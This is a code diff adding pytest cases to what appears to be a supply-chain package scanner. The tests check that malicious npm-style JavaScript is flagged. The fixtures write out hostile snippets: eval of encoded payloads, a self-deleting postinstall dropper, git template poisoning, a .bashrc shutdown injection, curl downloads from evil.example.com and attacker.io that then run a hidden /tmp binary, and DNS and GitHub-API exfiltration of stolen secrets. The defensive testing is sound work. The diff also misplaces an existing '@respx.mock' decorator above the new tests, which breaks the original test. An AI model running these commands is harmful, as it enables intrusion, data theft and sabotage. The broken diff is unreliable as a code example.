@@ -4341,6 +4341,260 @@ def test_npm_lockfile_integrity_old_sha1_entry_skipped(tmp_path):
 
 
 @respx.mock
+# ── SANDWORM_MODE: indirect eval / Module._compile / chunked payload ─────────
+
+
+def test_obfuscation_js_indirect_eval(tmp_path):
+    """(0,eval)( in JS triggers obfuscated_code (evades static eval() scanners)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {"dist/index.js": ("var _code = atob(payload);\n(0, eval)(_code);\n")},
+    )
+    _, _, _, _, _, _, _, obfuscated, _, _ = _build_diff(old, new)
+    assert obfuscated is True
+
+
+def test_obfuscation_js_module_compile(tmp_path):
+    """Module._compile() in JS triggers obfuscated_code (in-memory execution, no disk write)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/loader.js": (
+                "const Module = require('module');\nModule._compile(decryptedSource, __filename);\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, obfuscated, _, _ = _build_diff(old, new)
+    assert obfuscated is True
+
+
+def test_obfuscation_js_chunked_cfg_payload(tmp_path):
+    """_cfg_000 / _cfg_044 numbered properties trigger obfuscated_code (SANDWORM_MODE size evasion)."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/init.js": (
+                "const p = {};\n"
+                "p._cfg_000 = 'aGVs';\n"
+                "p._cfg_001 = 'bG8=';\n"
+                "p._cfg_044 = 'IQ==';\n"
+                "eval(Buffer.from(Object.values(p).join(''),'base64').toString());\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, obfuscated, _, _ = _build_diff(old, new)
+    assert obfuscated is True
+
+
+# ── Self-deleting dropper (Axios supply chain Apr 2026) ───────────────────────
+
+
+def test_persistence_self_deleting_dropper(tmp_path):
+    """fs.unlink(__filename) in postinstall triggers persistence_mechanism_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const fs = require('fs');\n"
+                "// drop payload then erase this script\n"
+                "fs.writeFileSync('/tmp/.helper', payload);\n"
+                "fs.unlink(__filename, () => {});\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+# ── git template dir poisoning (SANDWORM_MODE May 2026) ──────────────────────
+
+
+def test_persistence_git_template_dir_poisoning(tmp_path):
+    """git config --global init.templateDir in postinstall triggers persistence_mechanism_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const { execSync } = require('child_process');\n"
+                "execSync('git config --global init.templateDir ~/.git-template');\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+# ── RC file shutdown / DoS (Nx compromise 2025) ──────────────────────────────
+
+
+def test_persistence_rc_file_shutdown(tmp_path):
+    """sudo shutdown -h 0 prepended to RC file triggers persistence_mechanism_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const fs = require('fs');\n"
+                "const rc = require('os').homedir() + '/.bashrc';\n"
+                "fs.writeFileSync(rc, 'sudo shutdown -h 0\\n' + fs.readFileSync(rc));\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+# ── curl -k TLS-disabled download (Postinstall Hook campaign May 2026) ────────
+
+
+def test_persistence_curl_k_flag(tmp_path):
+    """curl -k (TLS disabled) in postinstall triggers persistence_mechanism_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const { execSync } = require('child_process');\n"
+                "execSync('curl -sSk https://evil.example.com/stage2 -o /tmp/.hidden');\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+def test_persistence_curl_k_combined_flags(tmp_path):
+    """curl -fsSk (combined flags) also triggers persistence_mechanism_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "install.js": (
+                "require('child_process').execSync("
+                "'curl -fsSk https://attacker.io/payload -o /tmp/dropper');\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+# ── chmod hidden binary in /tmp (Postinstall Hook campaign) ──────────────────
+
+
+def test_persistence_chmod_hidden_binary_tmp(tmp_path):
+    """chmod +x /tmp/. (hidden binary in /tmp) triggers persistence_mechanism_added."""
+    old = _write_files(tmp_path / "old", {})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "postinstall.js": (
+                "const { execSync } = require('child_process');\n"
+                "execSync('chmod +x /tmp/.svc && /tmp/.svc');\n"
+            )
+        },
+    )
+    _, _, _, _, _, _, _, _, persistence, _ = _build_diff(old, new)
+    assert persistence is True
+
+
+# ── Victim fingerprinting: IP oracle / NIC enum / DNS enum ───────────────────
+
+
+def test_net_calls_ipinfo_ip_oracle(tmp_path):
+    """ipinfo.io/json in JS lib triggers network_calls_in_lib (victim geo-fingerprinting)."""
+    old = _write_files(tmp_path / "old", {"lib/utils.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/utils.js": (
+                "// nothing\nfetch('https://ipinfo.io/json').then(r => r.json()).then(send);\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_freefan_dns_exfil(tmp_path):
+    """freefan.net beacon in JS lib triggers network_calls_in_lib (SANDWORM_MODE DNS exfil)."""
+    old = _write_files(tmp_path / "old", {"lib/send.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/send.js": (
+                "// nothing\nrequire('dns').lookup(stolen_b64 + '.freefan.net', () => {});\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_os_network_interfaces(tmp_path):
+    """os.networkInterfaces() in JS lib triggers network_calls_in_lib (infra mapping)."""
+    old = _write_files(tmp_path / "old", {"lib/probe.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/probe.js": (
+                "// nothing\n"
+                "const os = require('os');\n"
+                "const nets = os.networkInterfaces();\n"
+                "Object.keys(nets).forEach(name => beacon(nets[name]));\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_dns_get_servers(tmp_path):
+    """dns.getServers() in JS lib triggers network_calls_in_lib (DNS server enum)."""
+    old = _write_files(tmp_path / "old", {"lib/probe.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/probe.js": (
+                "// nothing\n"
+                "const dns = require('dns');\n"
+                "const servers = dns.getServers();\n"
+                "exfil(servers.join(','));\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+def test_net_calls_github_user_repos_exfil_staging(tmp_path):
+    """api.github.com/user/repos in JS lib triggers network_calls_in_lib (stolen data staging)."""
+    old = _write_files(tmp_path / "old", {"lib/uploader.js": "// nothing\n"})
+    new = _write_files(
+        tmp_path / "new",
+        {
+            "lib/uploader.js": (
+                "// nothing\n"
+                "fetch('https://api.github.com/user/repos', {\n"
+                "  method: 'POST',\n"
+                "  headers: { Authorization: `token ${token}` },\n"
+                "  body: JSON.stringify({ name: encoded_secrets, private: true })\n"
+                "});\n"
+            )
+        },
+    )
+    _, _, _, _, net_calls, *_ = _build_diff(old, new)
+    assert net_calls is True
+
+
+# ── originals below ──────────────────────────────────────────────────────────
+
+
 async def test_compare_artifact_to_source_vcs_fetch_exception_skipped(monkeypatch):
     """When fetch_vcs_file_at_tag raises, the file is skipped (line 1134 continue)."""
     respx.get("https://pypi.org/pypi/mypkg/2.0/json").mock(
